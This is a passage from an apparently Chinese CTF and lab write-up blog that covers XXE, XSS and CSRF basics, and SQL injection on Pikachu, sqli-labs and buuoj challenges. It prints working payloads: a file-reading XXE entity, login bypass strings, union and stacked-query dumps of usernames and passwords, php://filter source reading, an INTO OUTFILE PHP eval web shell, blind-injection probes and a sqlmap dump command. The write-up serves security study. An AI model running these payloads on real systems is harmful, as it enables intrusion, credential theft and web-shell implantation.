“根本没传 XML”</td></tr><tr><td><code>Cannot modify header information - headers already sent</code></td><td>次要问题：报错信息先输出到页面，后续代码想改 HTTP 头（比如跳转 &#x2F; 返回 JSON）失败</td><td>这是无关紧要的连锁错误，解决核心问题后会自动消失</td></tr><tr><td><code>&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;&lt;/msg&gt;&lt;/result&gt;</code></td><td>服务器返回的最终结果：<code>code=0</code>表示操作失败，<code>msg</code>为空</td><td>验证了服务器没处理到有效内容，直接返回失败</td></tr></tbody></table><p>期待你用抓包传值</p><p>3.构造</p><p>file:&#x2F;&#x2F;&#x2F;flag</p><p><user><username>username</username><password>password</password></user></p><p>注意格式：&flag;</p><p><code>&amp;xxx;</code>是 XML 中<strong>实体引用的专属格式</strong>（相当于 “变量调用”），而<code>123</code>是<strong>普通文本</strong>（直接写的固定值），只有 “调用变量” 时才需要<code>&amp;</code>和<code>;</code>，写固定值时直接写就行。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 输出 [</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;flag;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-xss</title>
      <link href="/posts/cacccfa7.html"/>
      <url>/posts/cacccfa7.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-xss"><a href="#web-xss" class="headerlink" title="web-xss"></a>web-xss</h2><p>1.反射型（外部输入后，在浏览器端输出触发）</p><p>2.存储型（东西存在文件中，web程序读取代码并输出）</p><p>知识点1：</p><p>html实体编码：</p><p><strong>HTML 实体编码</strong> 的规则是： <code>&amp;#</code> + <code>十进制 ASCII 码</code> + <code>;</code></p><ul><li>字母 <strong>r</strong> 的十进制 ASCII 码是 <strong>114</strong>。</li><li>所以它的 HTML 实体编码就是 <strong><code>r</code></strong>。</li></ul><p><strong>CSRF：到底是什么？</strong></p><p><strong>黑客没偷你的证件</strong>（他拿不到 Cookie）。</p><p><strong>黑客只是骗你点了一下按钮</strong>（利用了你还在登录状态的权限）。</p><p><strong>结果：</strong> 在你完全不知情的情况下，你的身份被黑客**“借用”**了。</p><p>举例：</p><p><code>&lt;img= src=1 oner&amp;#114;or=ale&amp;#114;t(1)&gt;</code></p><p>知识点2：</p><p>Referer 是看你<strong>从哪来</strong>。</p><p><strong>Token</strong> 是看你<strong>带没带暗号</strong>。</p><p> Sec-Fetch</p><ul><li><strong>Sec</strong>: 是 <strong>Security</strong>（安全）的缩写。</li><li><strong>Fetch</strong>: 翻译为 <strong>“获取”</strong> 或 <strong>“抓取”</strong>（在编程里指代发起一个网络请求）。</li><li><strong>合起来的意思：</strong> <strong>“安全获取元数据”</strong>（Security Fetch Metadata）。</li></ul><p>它是浏览器在发起请求时，自动给服务器打的“防伪标签”。它告诉服务器：这个请求是谁发起的、是怎么发起的、为什么要发起。</p>]]></content>
      
      
      <categories>
          
          <category> ctf题解 </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-未整理解题过程</title>
      <link href="/posts/2198140d.html"/>
      <url>/posts/2198140d.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-未整理解题过程"><a href="#web-未整理解题过程" class="headerlink" title="web-未整理解题过程"></a>web-未整理解题过程</h2><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>1.账号密码登陆题目</p><p>方法一：万能账户密码<br>判断闭合方式后就可以套公式啦</p><p>sql语句：<a href=""></a><br>1.原本：随便输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure><p>2.我们要做的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27; or ture #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure><p>当输入   a’ or ture #<br>整句话会被解析成：    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx一堆被闭合的垃圾话xx       or ture </span><br></pre></td></tr></table></figure><p>（一个成立即为真）</p><p>where条件为真，执行最前面select语句</p><p>那么就通关了</p><p>这里有一个问题：为什么账号和密码只要一个填了万能公式就可以成功？<br>你先想一下：账号填了这个万能公式，密码填的明明是错的为什么可以对？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27;      a&#x27;        or ture          #     &#x27; and password=&#x27;123&#x27;;</span><br></pre></td></tr></table></figure><p>即使密码是错的，但是被注释掉了<br>只要整个语句的值是真的就欧克</p><p>所以当我们密码用万能时，语句变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT*FROM table_name WHERE username=&#x27; a&#x27; and password=&#x27; a&#x27;     or true      #&#x27;;</span><br></pre></td></tr></table></figure><p>你说你输什么用户能让这句话错吗？nonononono</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>这道题设计代审，我们会到某一个步骤发现php代码，然后按照提示我们需要用伪协议读取flag.php，</p><p>但是，千万注意：</p><p>因为关键的代码</p><p>这些都是漏洞，而想要利用这些漏洞构造payload必须要在这个网页上面</p><p>因此我们需要在此网页后直接跟payload：</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;你想要看的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><!DOCTYPE html><html><p>这里得到的码在经过转码就能看到:</p><pre><code>&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;FLAG&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;        &lt;?php            echo &quot;我就在这里&quot;;            $flag = &#39;flag{76a1cef7-2036-42cf-ab49-d9fc9bcba947}&#39;;            $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;        ?&gt;    &lt;/p&gt;&lt;/body&gt;</code></pre></html><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>随便注，那就sql注入</p><p>输入万能</p><p>发现字符型注入</p><p>发现数组，没啥用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li><p>order by，没结果。果断使用堆叠注入</p></li><li><p>selcet发现被过滤</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>1’;show tables;#</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6.1 </p><p>预编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE  hacker;#</span><br></pre></td></tr></table></figure><p>6.2</p><p>handle</p><p>HANDLER 功能类似<code>SELECT * FROM 表名</code>，在不能用select的时候使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#</span><br><span class="line"></span><br><span class="line">1&#x27;;</span><br><span class="line">HANDLER `1919810931114514` OPEN;</span><br><span class="line">HANDLER `1919810931114514` READ FIRST;</span><br><span class="line">HANDLER `1919810931114514` CLOSE;#</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER `<span class="number">1919810931114514</span>` <span class="keyword">OPEN</span>;          <span class="comment">-- 打开数据表</span></span><br><span class="line">HANDLER `<span class="number">1919810931114514</span>` READ <span class="keyword">FIRST</span>;     <span class="comment">-- 读取表的第一行数据</span></span><br><span class="line">HANDLER `<span class="number">1919810931114514</span>` <span class="keyword">CLOSE</span>;          <span class="comment">-- 关闭数据表</span></span><br></pre></td></tr></table></figure><h2 id="Pikachu靶场-SQL注入-数字型注入（post）题解"><a href="#Pikachu靶场-SQL注入-数字型注入（post）题解" class="headerlink" title="Pikachu靶场-SQL注入-数字型注入（post）题解"></a>Pikachu靶场-SQL注入-数字型注入（post）题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select * from 表 where 字段=输入内容`（无引号，直接接数字）</span><br></pre></td></tr></table></figure><p>1.抓包，发现有id&#x3D;3&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2，这个就是注入点</p><p>2.输入id&#x3D;3 and 1&#x3D;1 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2 没报错</p><p>  输入id&#x3D;3 and 1&#x3D;2 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2 报错</p><p>由此，我们知道报错页面和没报错页面长啥样</p><p>3.寻找有多少个字段显示（1-3都输入后，发现3报错）</p><p>  输入id&#x3D;3 order by 1 –&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2</p><p>因此只有两个字段</p><p>4.select显示</p><p>  输入id&#x3D;3 union select 11，22 –</p><p>  输出：</p><p>hello,kobe <br />your email is: <a href="mailto:&#107;&#x6f;&#x62;&#101;&#x40;&#112;&#105;&#x6b;&#97;&#x63;&#x68;&#117;&#46;&#x63;&#x6f;&#x6d;">kobe@pikachu.com</a></p><p class='notice'>hello,11 <br />your email is: 22</p><p>5.找数据库名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select <span class="title function_">version</span>() ,<span class="title function_">database</span>() --</span><br></pre></td></tr></table></figure><p>数据库名：pikachu</p><p>6.找表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select table_name,22 from information_schema.tables where table_schema=database() -- </span><br></pre></td></tr></table></figure><p>表名：users</p><p>7.找列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select column_name,22 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27; -- bbq</span><br></pre></td></tr></table></figure><p>列名：user，password</p><p>8.找数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password <span class="keyword">from</span> users -- bbq</span><br></pre></td></tr></table></figure><h2 id="Pikachu靶场-SQL注入-字符型注入（get）题解"><a href="#Pikachu靶场-SQL注入-字符型注入（get）题解" class="headerlink" title="Pikachu靶场-SQL注入-字符型注入（get）题解"></a>Pikachu靶场-SQL注入-字符型注入（get）题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段=&#x27;输入内容&#x27;</span><br></pre></td></tr></table></figure><p>1.输入万能密码</p><p>得到：</p><p>your uid:1<br>your email is: <a href="mailto:&#118;&#105;&#110;&#99;&#x65;&#x40;&#112;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#46;&#99;&#x6f;&#109;">vince@pikachu.com</a></p><p>your uid:2<br>your email is: <a href="mailto:&#97;&#x6c;&#x6c;&#x65;&#110;&#64;&#x70;&#105;&#x6b;&#x61;&#x63;&#104;&#117;&#x2e;&#99;&#111;&#109;">allen@pikachu.com</a></p><p>your uid:3<br>your email is: <a href="mailto:&#107;&#x6f;&#98;&#101;&#x40;&#x70;&#105;&#107;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#x6f;&#109;">kobe@pikachu.com</a></p><p>your uid:4<br>your email is: <a href="mailto:&#103;&#114;&#x61;&#x64;&#121;&#64;&#x70;&#105;&#107;&#x61;&#99;&#x68;&#117;&#46;&#99;&#x6f;&#x6d;">grady@pikachu.com</a></p><p>your uid:5<br>your email is: <a href="mailto:&#107;&#x65;&#x76;&#x69;&#110;&#64;&#112;&#105;&#107;&#x61;&#99;&#104;&#117;&#46;&#99;&#x6f;&#x6d;">kevin@pikachu.com</a></p><p>your uid:6<br>your email is: <a href="mailto:&#x6c;&#117;&#x63;&#121;&#x40;&#x70;&#x69;&#x6b;&#x61;&#x63;&#104;&#117;&#46;&#x63;&#x6f;&#x6d;">lucy@pikachu.com</a></p><p>your uid:7<br>your email is: <a href="mailto:&#x6c;&#105;&#108;&#x69;&#64;&#112;&#105;&#x6b;&#97;&#99;&#104;&#117;&#46;&#99;&#x6f;&#x6d;">lili@pikachu.com</a></p><p>所以，我们能找到账号和密码，并且让它展示出来像这样就好了</p><p>your uid:账号<br>your email is: 密码</p><p>2.寻找账号密码，就需要知道他们在哪儿</p><p>查数据库：pikachu</p><p>查表：有个users表</p><p>查列名：找到passwd和username两个列名</p><p>显示账号密码：select password，username from users #</p><p>3.得到答案</p><h2 id="Pikachu靶场-SQL注入-搜索型注入-题解"><a href="#Pikachu靶场-SQL注入-搜索型注入-题解" class="headerlink" title="Pikachu靶场-SQL注入-搜索型注入 题解"></a>Pikachu靶场-SQL注入-搜索型注入 题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段 like &#x27;%输入内容%&#x27;</span><br></pre></td></tr></table></figure><p>找字段：</p><p>a%’ order by 2 #</p><h2 id="Pikachu靶场-SQL注入-xx型注入-题解"><a href="#Pikachu靶场-SQL注入-xx型注入-题解" class="headerlink" title="Pikachu靶场-SQL注入-xx型注入 题解"></a>Pikachu靶场-SQL注入-xx型注入 题解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表 where 字段 like (&#x27;输入内容&#x27;)</span><br></pre></td></tr></table></figure><p>找字段：</p><p>a’) order by 2 #</p><p><code>outfile</code></p><p>1.SELECT … INTO OUTFILE ‘文件路径’  &#x2F;&#x2F;可以把搜索到的数据导出到文本文件上</p><p>2.secure_file_priv 的三种结果含义是：<br> NULL 表示不能导出文件<br> 空值表示可以导出到任意路径<br> 指定路径表示只能导出到该路径</p><p>3.@@secure_file_priv 用来判断你能不能写文件、能不能写 shell<br>4.@@datadir 用来查看数据库真实存放在哪个磁盘目录</p><h2 id="sqli-7-题解"><a href="#sqli-7-题解" class="headerlink" title="sqli-7 题解"></a>sqli-7 题解</h2><p>1.经过一系列探索注入尝试发现输入结构:（（’’）），且字段数为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;)) union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure><p>这道题目没有回显，不能用联合注入</p><p>2.决定使用outfile进行木马注入</p><p>观察源代码</p><p>发现：输出错误信息这一行被注释掉了，所以不能用报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;You are in.... Use outfile......&#x27;;</span><br><span class="line">  echo &quot;&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">echo &#x27;You have an error in your SQL syntax&#x27;;</span><br><span class="line">//print_r(mysql_error());     //输出错误信息这一行被注释掉了，所以不能用报错注入</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>于是想起题目提示：use outfile</p><p>注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，<br>打开my.ini配置文件，并修改其中的<code>secure_file_priv=&#39;D://&#39;</code><br>参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)<br>修改完成并重启后在MySQL命令行中输入<code>show variables like &#39;%secure%&#39;;</code>查看是否设置成功。</p><p>但是有使用条件：</p><p>​1.你有没有权限</p><p>​2.你知道你写入的文件在哪里（网站在服务器上的绝对路径）</p><p>​找法：Web 路径只能通过：读源码、猜默认目录、或从数据库配置反推。</p><p>​用靶场第二关来获得绝对路径。@@basedir()是安装MYSQL的安装路径 ，@@datadir()是安装MYSQL的数据文件路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,@@basedir,@@datadir</span><br><span class="line">    basedir()指定了安装MYSQL的安装路径</span><br><span class="line">    datadir()指定了安装MYSQL的数据文件路径</span><br></pre></td></tr></table></figure><p>使用木马：</p><p>select 内容 into outfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,2,&#x27;&lt;?php eval(@$_POST[&quot;cmd&#x27;&quot;]);?&gt;&#x27; into outfile&quot;F:\\phpstudy_pro\\WWW\\sqli-labs\\less-7\\hack.php&quot;--+</span><br></pre></td></tr></table></figure><p>3.连接yijian，获得wedshell权限</p><h2 id="sqli-8-题解（布尔盲注）"><a href="#sqli-8-题解（布尔盲注）" class="headerlink" title="sqli-8 题解（布尔盲注）"></a>sqli-8 题解（布尔盲注）</h2><h6 id="方法一：手搓"><a href="#方法一：手搓" class="headerlink" title="方法一：手搓"></a>方法一：手搓</h6><p>1.前期准备：</p><p>判断注入类型，字段个数（没有显示位，字符型注入）</p><p>2.布尔盲注</p><p>python sqlmap.py -u “<a href="http://286a3ec8-212c-4ea7-bb63-f896372bbe7e.node5.buuoj.cn/Less-8/?id=1">http://286a3ec8-212c-4ea7-bb63-f896372bbe7e.node5.buuoj.cn/Less-8/?id=1</a>‘“ -D security -T users -C username,password –dump –batch</p><p>步骤1：判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&gt;1--+   //正常</span><br><span class="line">?id=1&#x27; and length(database())&gt;10--+  //报错</span><br><span class="line">?id=1&#x27; and length(database())&gt;5--+   //正常</span><br><span class="line">?id=1&#x27; and length(database())&gt;8--+   //报错</span><br><span class="line">?id=1&#x27; and length(database())&gt;7--+   //正常</span><br></pre></td></tr></table></figure><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&#x27; and <span class="built_in">length</span>(database())=<span class="number">8</span> --+</span><br></pre></td></tr></table></figure><p>步骤2：数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;100 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;110 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;114 --+   //正常</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;115 --+   //报错</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) =115 --+</span><br></pre></td></tr></table></figure><p>115对应的的是s，继续猜测剩下的字母</p><p>得database&#x3D;’security’</p><p>步骤3：判断表的数量</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span> <span class="keyword">and</span> (<span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())=<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p>步骤4：表名</p><p>判断表长度</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1&#x27;</span> <span class="function"><span class="keyword">and</span> <span class="title">length</span>(<span class="params">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=database(</span>) limit 0,1))</span>=<span class="number">6</span>--+</span><br></pre></td></tr></table></figure><p>。。。。。。。太多了，不如用sqlmap</p><p>但要大致学会原理：</p><h4 id="一、布尔盲注"><a href="#一、布尔盲注" class="headerlink" title="一、布尔盲注"></a>一、布尔盲注</h4><p>布尔盲注是一种基于布尔逻辑的盲注方法。</p><p>在sqli-labs的第八关中，我们可以尝试使用布尔盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND (SELECT * FROM users WHERE username=&#x27;admin&#x27;)=1 --</span><br></pre></td></tr></table></figure><p>如果上述查询语句返回结果集，说明“admin”这个用户名存在于用户表中。接着，我们可以尝试构造一个包含密码猜测的查询语句，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND (SELECT * FROM users WHERE username=&#x27;admin&#x27; AND password=&#x27;password&#x27;)=1 --</span><br></pre></td></tr></table></figure><p>如果返回结果集，说明我们猜测的密码可能是正确的。通过不断尝试不同的密码，最终可以获取到管理员的密码。</p><h4 id="二、时间盲注"><a href="#二、时间盲注" class="headerlink" 